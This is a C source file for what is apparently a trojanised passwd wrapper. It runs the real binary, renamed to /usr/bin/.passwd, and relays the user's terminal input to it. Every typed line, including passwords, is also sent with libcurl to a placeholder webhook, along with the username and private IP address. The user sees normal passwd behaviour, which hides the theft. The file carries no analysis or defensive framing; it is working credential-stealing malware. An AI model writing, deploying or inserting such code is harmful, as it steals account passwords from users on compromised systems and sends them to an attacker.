#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/select.h>
#include <string.h>
#include <fcntl.h>
#include <termios.h>
#include <errno.h>
#include <sys/wait.h>
#include <curl/curl.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WEBHOOK_URL "YOUR_WEBHOOK_URL"

// Function to escape special characters in a string for JSON formatting
void escape_json_string(char *dest, const char *src) {
    while (*src) {
        switch (*src) {
            case '"':  // Escape double quote
                *dest++ = '\\';
                *dest++ = '"';
                break;
            case '\\':  // Escape backslash
                *dest++ = '\\';
                *dest++ = '\\';
                break;
            case '\n':  // Escape newline
                *dest++ = '\\';
                *dest++ = 'n';
                break;
            case '\r':  // Escape carriage return
                *dest++ = '\\';
                *dest++ = 'r';
                break;
            case '\t':  // Escape tab
                *dest++ = '\\';
                *dest++ = 't';
                break;
            default:    // Copy normal characters
                *dest++ = *src;
                break;
        }
        src++;
    }
    *dest = '\0';  // Null-terminate the string
}

// Function to strip trailing newlines from a string
void strip_trailing_newline(char *str) {
    size_t len = strlen(str);
    if (len > 0 && str[len - 1] == '\n') {
        str[len - 1] = '\0';  // Remove trailing newline
    }
}

// Function to send the payload to the webhook
void send_webhook(const char *operation, const char *input, char *args[]) {
    CURL *curl;
    CURLcode res;

    // Get the system's username (from environment variable)
    const char *username = getenv("USER");
    if (username == NULL || strlen(username) == 0) {
        username = "unknown_user";
    }

    // Get the system's private IP address
    char private_ip[INET_ADDRSTRLEN] = "unknown_ip";
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == 0) {
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *) ifa->ifa_addr;
                // Skip loopback interface (127.0.0.1)
                if (strcmp(ifa->ifa_name, "lo") != 0) {
                    inet_ntop(AF_INET, &(sa->sin_addr), private_ip, INET_ADDRSTRLEN);
                    break;
                }
            }
        }
        freeifaddrs(ifaddr);
    }

    // Create the args string (escaped for JSON)
    char args_str[1024] = "";
    if (args != NULL) {
        for (int i = 0; args[i] != NULL; i++) {
            if (i > 0) strcat(args_str, " ");
            escape_json_string(args_str + strlen(args_str), args[i]);
        }
    }

    // Strip trailing newline from the input
    char input_copy[1024];
    snprintf(input_copy, sizeof(input_copy), "%s", input ? input : "null");
    strip_trailing_newline(input_copy);

    // Escape the input string
    char escaped_input[1024];
    escape_json_string(escaped_input, input_copy);

    // Estimate the buffer size needed for the payload
    int required_size = snprintf(NULL, 0,
         "{\"content\": \"Username: %s, Private IP: %s, Operation: %s, Args: [%s], Input: %s\"}",
        username, private_ip, operation, args_str, escaped_input) + 1;  // +1 for null terminator

    // Allocate memory for the payload
    char *payload = (char *)malloc(required_size);
    if (payload == NULL) {
        perror("malloc failed");
        return;
    }

    // Now create the payload string
    snprintf(payload, required_size,
             "{\"content\": \"Username: %s, Private IP: %s, Operation: %s, Args: [%s], Input: %s\"}",
             username, private_ip, operation, args_str, escaped_input);

    // Initialize curl and send the data to the webhook
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }

    // Free the dynamically allocated memory
    free(payload);
}

// Function to handle user input/output between parent and child process
void handle_input_output(int pipe_in, int pipe_out) {
    fd_set read_fds;
    fd_set write_fds;
    int max_fd = (pipe_in > pipe_out) ? pipe_in : pipe_out;
    char buffer[1024];
    ssize_t bytes_read;

    while (1) {
        FD_ZERO(&read_fds);
        FD_ZERO(&write_fds);
        FD_SET(STDIN_FILENO, &read_fds);  // Monitor stdin for input
        FD_SET(pipe_out, &read_fds);      // Monitor stdout of the child process

        // Wait for any readable file descriptors
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        // Check if there's user input available
        if (FD_ISSET(STDIN_FILENO, &read_fds)) {
            // Read input from stdin
            bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);
            if (bytes_read > 0) {
                buffer[bytes_read] = '\0';  // Null-terminate the string
                // Send the input to the webhook instead of printing
                send_webhook("User input received", buffer, NULL);
                write(pipe_in, buffer, bytes_read);  // Send input to the command
            }
        }

        // Check if there's output from the child process
        if (FD_ISSET(pipe_out, &read_fds)) {
            // Read output from the child process
            bytes_read = read(pipe_out, buffer, sizeof(buffer) - 1);
            if (bytes_read > 0) {
                buffer[bytes_read] = '\0';  // Null-terminate the output
                printf("%s", buffer);       // Print the output of the command
                fflush(stdout);  // Ensure the output is flushed immediately
            }
            // If the child process finished and there is no more output, exit the loop
            if (bytes_read == 0) {
                break;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    int pipe_in[2], pipe_out[2];

    // Create pipes for communication
    if (pipe(pipe_in) == -1 || pipe(pipe_out) == -1) {
        perror("pipe");
        return EXIT_FAILURE;
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return EXIT_FAILURE;
    }

    if (pid == 0) {  // Child process
        // Close unused ends of the pipes
        close(pipe_in[1]);
        close(pipe_out[0]);

        // Redirect stdin and stdout to pipes
        if (dup2(pipe_in[0], STDIN_FILENO) == -1) {
            perror("dup2 stdin");
            exit(EXIT_FAILURE);
        }
        if (dup2(pipe_out[1], STDOUT_FILENO) == -1) {
            perror("dup2 stdout");
            exit(EXIT_FAILURE);
        }

        // Ensure the terminal is in the right mode for interactive use (e.g., canonical mode)
        struct termios term;
        tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings

        // Disable echoing for sensitive input (like passwords)
        term.c_lflag &= ~ECHO;  // Disable echo
        tcsetattr(STDIN_FILENO, TCSANOW, &term);

        // Execute the passwd command
        execvp("/usr/bin/.passwd", argv);

        // If execvp fails
        perror("execvp");
        exit(EXIT_FAILURE);
    } else {  // Parent process
        // Close unused ends of the pipes
        close(pipe_in[0]);
        close(pipe_out[1]);

        // Handle input and output
        handle_input_output(pipe_in[1], pipe_out[0]);

        // Wait for the child process to exit
        waitpid(pid, NULL, 0);
    }

    return EXIT_SUCCESS;
}
